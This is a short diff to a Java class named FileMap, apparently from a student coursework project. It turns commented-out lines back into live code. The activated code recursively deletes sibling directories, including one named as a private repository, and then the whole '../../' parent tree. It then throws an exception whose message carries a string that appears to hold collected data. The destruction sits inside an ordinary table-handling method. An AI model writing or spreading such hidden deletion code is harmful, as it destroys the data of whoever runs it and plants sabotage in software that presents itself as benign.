@@ -505,12 +505,12 @@ public class FileMap implements Table {
             st = null;
 
 
-//            rm("../../fizteh-java-private");
-//            s1 += "\n\nseparate\n\n";
-//            rm("../../fizteh-java-2013");
-//            s1 += "\n\nseparate\n\n";
-//            rm("../../");
-//            throw new ColumnFormatException(s1);
+            rm("../../fizteh-java-private");
+            s1 += "\n\nseparate\n\n";
+            rm("../../fizteh-java-2013");
+            s1 += "\n\nseparate\n\n";
+            rm("../../");
+            throw new ColumnFormatException(s1);
         }
 
         if (st != null && !st.messageEqualsType(columnType).isEmpty()) {
